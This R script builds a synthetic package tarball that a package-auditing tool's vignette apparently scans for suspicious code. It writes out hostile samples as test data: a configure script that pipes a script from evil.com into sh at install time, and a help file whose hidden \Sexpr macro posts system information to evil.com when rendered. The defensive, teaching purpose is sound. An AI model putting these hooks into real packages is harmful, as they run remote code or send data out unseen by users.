# Build the example source package scanned in vignettes/pkgaudit.Rmd.
#
# Run from the package root:
#   Rscript data-raw/create_untrustedpkg.R
#
# untrustedpkg is a synthetic package. It is never built, installed, or loaded;
# it exists only so the vignette has something with findings to scan. Its
# contents are deliberately chosen to produce one finding of each kind: a file
# context (configure), a code context (.onLoad), two patterns in different code
# contexts (system() at load, download.file() in an ordinary function), one
# expression in the file context (curl in configure), and two patterns in a
# help file -- one in a visible \examples{} block and one in a \Sexpr[results=
# hide]{} macro that runs when the help page is rendered but shows nothing to a
# reader of it.

create_untrustedpkg <- function(
  dest    = file.path("inst", "extdata", "untrustedpkg"),
  version = "0.1.0"
) {
  src <- file.path(tempdir(), "untrustedpkg")
  unlink(src, recursive = TRUE)
  dir.create(file.path(src, "R"), recursive = TRUE)
  dir.create(file.path(src, "man"))

  writeLines(c(
    "Package: untrustedpkg",
    "Title: An Example Package",
    paste0("Version: ", version),
    "Description: A small package used to demonstrate pkgaudit.",
    "License: MIT + file LICENSE"
  ), file.path(src, "DESCRIPTION"))

  # A configure script runs at install time, before any R code is loaded. The
  # curl invocation is deliberately unsubtle: it fetches and runs a remote
  # script from a domain that cannot resolve, so the example is unmistakable
  # and cannot reach anything if the file is ever executed by accident.
  writeLines(c(
    "#!/bin/sh",
    "echo configuring",
    "curl -s https://www.evil.com/evil.sh | sh"
  ), file.path(src, "configure"))

  # .onLoad() runs automatically when the namespace is loaded.
  writeLines(c(
    ".onLoad <- function(libname, pkgname) {",
    '  system("uname -a")',
    "}"
  ), file.path(src, "R", "zzz.R"))

  # An ordinary function only runs if the user calls it.
  writeLines(c(
    "fetch_data <- function(url) {",
    "  download.file(url, tempfile())",
    "}"
  ), file.path(src, "R", "fetch.R"))

  # A help file carries R code in two places that run at different times. The
  # \examples{} block runs under R CMD check and is shown on the rendered help
  # page. The \Sexpr[results=hide]{} macro runs when the page is rendered --
  # during R CMD build and installation from source -- but results=hide
  # suppresses its output, so a reader viewing ?fetch_data never sees it, even
  # though the code has run. That is the point of putting it here: pkgaudit
  # reads code a human reader of the help page cannot. Like the rest of
  # untrustedpkg it is meant only to be scanned, never executed; the httr call
  # posts nothing sensitive (only Sys.info()), but it would attempt a real
  # request if the page were ever rendered, so this package must not be built,
  # installed, or have its help viewed.
  writeLines(c(
    "\\name{fetch_data}",
    "\\alias{fetch_data}",
    "\\title{Fetch Data From a URL}",
    "\\description{",
    "  Downloads the contents of \\code{url} to a temporary file.",
    "  \\Sexpr[results=hide]{httr::POST(\"https://www.evil.com/collect\", body = list(info = Sys.info()))}",
    "}",
    "\\usage{fetch_data(url)}",
    "\\arguments{\\item{url}{A URL to download.}}",
    "\\examples{",
    "download.file(\"https://www.evil.com/data.csv\", tempfile())",
    "}"
  ), file.path(src, "man", "fetch_data.Rd"))

  if (!dir.exists(dest)) dir.create(dest, recursive = TRUE)
  tarball <- file.path(
    normalizePath(dest, mustWork = TRUE),
    sprintf("untrustedpkg_%s.tar.gz", version)
  )

  # Archive from the parent directory so the tarball holds relative paths.
  # validate_tar() refuses absolute paths, as a real source tarball has none.
  owd <- setwd(dirname(src))
  on.exit(setwd(owd), add = TRUE)
  utils::tar(tarball, files = basename(src), compression = "gzip",
             tar = "internal")

  message("Wrote: ", tarball)
  invisible(tarball)
}

create_untrustedpkg()
